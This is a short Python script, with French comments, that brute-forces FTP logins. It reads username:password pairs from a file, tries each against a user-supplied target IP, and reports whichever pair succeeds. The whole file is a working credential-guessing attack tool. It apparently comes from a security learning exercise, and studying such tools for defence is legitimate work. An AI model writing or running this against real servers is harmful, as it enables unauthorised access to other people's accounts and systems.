#!usr/bin/python

import ftplib

def bruteLogin(hostname, passwdFile):
	try:
		pF = open((passwdFile), "r")
	except:
		print("[!] File doesn't exist !")
	for line in pF.readlines():
		userName = line.split(':')[0] #on rajoute le [0] pour dire que c'est le 1er composant avant les :
		passWord = line.split(':')[1].strip('\n')
		print("[+] Trying: " + userName + "/" + passWord)
		try:
			ftp = ftplib.FTP(hostname)
			login = ftp.login(userName, passWord)
			print("[+] Login succeeded with: " + userName + "/" + passWord)
			ftp.quit()
			return(userName,passWord) #après un return le programme quitte et ne fait pas la suite
		except:
			pass #on ne fait rien
	print("[-] Password not in list") #si aucun mdp n'a fonctionne

host = input("[*]Enter targets IP address: ")
passwdFile = input("[*] Enter User/passord file path: ")
bruteLogin(host, passwdFile)
